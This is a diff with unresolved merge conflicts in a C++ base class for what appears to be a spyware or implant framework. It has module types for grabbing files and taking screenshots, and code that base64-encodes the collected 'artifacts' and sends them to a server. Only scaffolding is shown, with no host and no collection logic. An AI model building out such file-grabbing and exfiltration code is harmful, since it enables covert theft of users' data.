@@ -14,8 +14,11 @@ passing its correspoing arguments.
 
 */
 
+<<<<<<< HEAD
 #define MAX_ARTIFACTS 1
 
+=======
+>>>>>>> 0a525aac6cf25fc80044469ea9b1a7edfccaaf57
 typedef enum SupportedModules {
         FILE_GRABBER=0,
         SCREEN_SHOOTER,
@@ -35,7 +38,11 @@ class BaseModule
 protected:
     json args;
     std::string module_type;
+<<<<<<< HEAD
     std::vector<json> artifacts;
+=======
+    std::vector<artifact_t> artifacts;
+>>>>>>> 0a525aac6cf25fc80044469ea9b1a7edfccaaf57
     bool run_;
 
     /* Derived classes with override this function */
@@ -67,6 +74,7 @@ protected:
             // payload[key.str()] = base64_artifact;
             payload.push_back(a);
         }
+<<<<<<< HEAD
 
         std::cout << "Sending artifacts to server: " << payload.dump() << std::endl;
 
@@ -78,6 +86,16 @@ protected:
     //     return CryptoUtils::base64_encode(a.artifact, a.length);
     // }
 
+=======
+        Communicator::getInstance().send_artifact(payload);
+    }
+
+    std::string encode_artifacts(artifact_t a)
+    {
+        return CryptoUtils::base64_encode(a.artifact, a.length);
+    }
+
+>>>>>>> 0a525aac6cf25fc80044469ea9b1a7edfccaaf57
 private:
     static const char * module_names[];
 
@@ -87,7 +105,11 @@ public:
 
     BaseModule(const BaseModule &) = delete;
 
+<<<<<<< HEAD
     BaseModule(std::string mtype, const json & module_args) : args(module_args), module_type(mtype), run_(true) {
+=======
+    BaseModule(std::string mtype, const json & module_args) : args(module_args), module_type(mtype){
+>>>>>>> 0a525aac6cf25fc80044469ea9b1a7edfccaaf57
         /**/
     }
 
@@ -102,7 +124,10 @@ public:
    
     virtual void run()
     {
+<<<<<<< HEAD
         std::cout << "Running the " << module_type << " module" << std::endl;
+=======
+>>>>>>> 0a525aac6cf25fc80044469ea9b1a7edfccaaf57
         while (run_)
         {
             module_impl();
